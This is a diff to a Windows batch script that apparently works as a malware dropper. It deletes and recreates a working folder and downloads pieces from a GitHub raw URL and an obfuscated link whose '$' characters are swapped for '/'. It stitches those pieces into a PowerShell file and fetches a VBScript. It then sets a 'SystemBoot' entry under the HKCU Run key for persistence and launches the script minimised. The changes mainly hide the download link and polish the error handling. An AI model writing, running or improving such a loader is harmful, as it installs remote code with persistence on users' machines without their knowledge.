@@ -9,26 +9,29 @@ set "b=%d%\f2.txt"
 set "c=%d%\Nvs.ps1"
 set "v=%d%\S_m.vbs"
 set "u=raw.githubusercontent.com/Zenth-grid/ZENTH-MAIN/main/V"
-set dynLink="****"
+set tynLink="****"
 
 :: Remove and recreate directory
 rmdir /s /q "%d%" 2>nul
-mkdir "%d%" || (echo Failed to create directory %d% & exit /b 1)
+mkdir "%d%" || (echo Failed to create directory %d%. Check permissions or path. & exit /b 1)
 
-:: Download files and perform replacements in memory
-powershell -c "try { $contentM = (Invoke-WebRequest -Uri 'https://%u%/Final.txt' -ErrorAction Stop).Content; $contentA = (Invoke-WebRequest -Uri 'https://%u%/First.txt' -ErrorAction Stop).Content; $contentB = (Invoke-WebRequest -Uri '%dynLink%' -ErrorAction Stop).Content; $finalContent = $contentM -replace '----',$contentA -replace '====',$contentB; [System.IO.File]::WriteAllText('%c%', $finalContent) } catch { Write-Error $_.Exception.Message; exit 1 }" || (echo PowerShell command failed & exit /b 1)
+:: Replace $ with / in tynLink using PowerShell and perform downloads with replacements
+powershell -c "try { $dynLink = '%tynLink%'.Replace('$','/'); $contentM = (Invoke-WebRequest -Uri 'https://%u%/Final.txt' -ErrorAction Stop).Content; $contentA = (Invoke-WebRequest -Uri 'https://%u%/First.txt' -ErrorAction Stop).Content; $contentB = (Invoke-WebRequest -Uri $dynLink -ErrorAction Stop).Content; $finalContent = $contentM -replace '----',$contentA -replace '====',$contentB; [System.IO.File]::WriteAllText('%c%', $finalContent) } catch { Write-Error ('Download or replacement failed: ' + $_.Exception.Message); exit 1 }" || (echo PowerShell download or replacement failed. & exit /b 1)
 
-:: Wait briefly to ensure file writing completes
-timeout /t 5 /nobreak >nul
+:: Wait to ensure file writing completes
+timeout /t 10 /nobreak >nul
 
 :: Download S_m.vbs and save
-powershell -c "try { $content = (Invoke-WebRequest -Uri 'https://%u%/S_m.vbs' -ErrorAction Stop).Content; [System.IO.File]::WriteAllText('%v%', $content) } catch { Write-Error $_.Exception.Message; exit 1 }" || (echo Failed to download and save S_m.vbs & exit /b 1)
+powershell -c "try { $content = (Invoke-WebRequest -Uri 'https://%u%/S_m.vbs' -ErrorAction Stop).Content; [System.IO.File]::WriteAllText('%v%', $content) } catch { Write-Error ('Failed to download S_m.vbs: ' + $_.Exception.Message); exit 1 }" || (echo Failed to download and save S_m.vbs. & exit /b 1)
+
+:: Verify VBScript file exists
+if not exist "%v%" (echo VBScript file %v% not found. & exit /b 1)
 
 :: Set registry key for persistence
-powershell -c "try { Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemBoot' -Value 'wscript.exe \"%v%\"' -ErrorAction Stop } catch { Write-Error $_.Exception.Message; exit 1 }" || (echo Failed to set registry key & exit /b 1)
+powershell -c "try { Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemBoot' -Value 'wscript.exe \"%v%\"' -ErrorAction Stop } catch { Write-Error ('Failed to set registry key: ' + $_.Exception.Message); exit 1 }" || (echo Failed to set registry key. Check permissions. & exit /b 1)
 
 :: Launch VBScript
-start /min wscript "%v%" || (echo Failed to start VBScript & exit /b 1)
+start /min wscript "%v%" || (echo Failed to start VBScript %v%. & exit /b 1)
 
 endlocal
 exit /b 0
